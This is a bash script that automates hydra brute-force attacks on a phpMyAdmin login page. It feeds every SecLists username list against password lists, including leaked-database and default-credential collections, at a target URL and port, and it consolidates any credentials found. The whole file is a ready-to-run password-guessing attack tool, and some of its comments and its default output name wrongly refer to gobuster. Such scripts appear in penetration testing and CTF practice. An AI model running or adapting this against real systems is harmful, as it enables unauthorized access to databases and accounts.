#!/bin/bash

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Parse arguments from flags
target_url=""
target_port="80"
output_file="gobuster.txt"
while getopts u:o:p: flag
do
    case "${flag}" in
        u) target_url=${OPTARG};;
        p) target_port=${OPTARG};;
        o) output_file=${OPTARG}
    esac
done

# Directories containing wordlist files
usernames=(
    "/usr/share/wordlists/SecLists/Usernames"
    "/usr/share/wordlists/SecLists/Usernames/Names"
    "/usr/share/wordlists/SecLists/Usernames/Honeypot-Captures"
)
passwords=(
    "/usr/share/wordlists/SecLists/Passwords"
    "/usr/share/wordlists/SecLists/Passwords/Common-Credentials"
    "/usr/share/wordlists/SecLists/Passwords/Cracked-Hashes"
    "/usr/share/wordlists/SecLists/Usernames/Default-Credentials"
    "/usr/share/wordlists/SecLists/Passwords/Honeypot-Captures"
    "/usr/share/wordlists/SecLists/Usernames/Leaked-Databases"
    "/usr/share/wordlists/SecLists/Passwords/Malware"
    "/usr/share/wordlists/SecLists/Usernames/Permutations"
    "/usr/share/wordlists/SecLists/Passwords/Software"
    "/usr/share/wordlists/SecLists/Usernames/Wifi-WPA"
)

# Gobuster options
hydra_options='-L {USERNAMES} -P {PASSWORDS} -o temp_result.txt -f -t 4 -s {PORT} {URL} http-post-form "/phpmyadmin/index.php:set_session=runvt2oidea63mi0a9s9ivu8nj&pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php&lang=en&token=265a5f702c7e7c667c5b4a752e247d3b:div id=\"pma_errors\""'
echo $hydra_options

# Temporary file for intermediate results
temp_file="temp_results_all.txt"

# Ensure the output file is empty before starting
> "$output_file"
> "$temp_file"

# Loop over directories
for userdir in "${usernames[@]}"; do
    echo "Processing directory: $userdir"
    # Loop over usernames files in each directory
    for usernames in "$userdir"/*.txt; do
        if [[ -f "$usernames" ]]; then
            echo "Using usernames: $usernames"

            for pwddir in "${passwords[@]}"; do
                echo "Processing directory: $pwddir"
                # Loop over passwords files in each directory
                for passwords in "$pwddir"/*.txt; do
                    if [[ -f "$passwords" ]]; then
                        echo "Using passwords: $passwords"
            
                        # Replace {WORDLIST} in gobuster options with the current wordlist
                        options=$(echo "$hydra_options" | sed "s|{USERNAMES}|$usernames|")
                        options=$(echo "$options" | sed "s|{PASSWORDS}|$passwords|")
                        options=$(echo "$options" | sed "s|{PORT}|$target_port|")
                        options=$(echo "$options" | sed "s|{URL}|$target_url|")
            
                        # Run hydra and append results to the temp file
                        echo "hydra $options"
                        /bin/sh -c "hydra $options"
                        if [[ -f "temp_result.txt" ]]; then
                            cat temp_result.txt >> "$temp_file"
                            rm temp_result.txt
                        fi
                    fi
                done
            done
        fi
    done
done

# Remove duplicates and write to the final output file
sort -u "$temp_file" > "$output_file"
rm "$temp_file"

echo "Consolidated results saved in: $output_file"
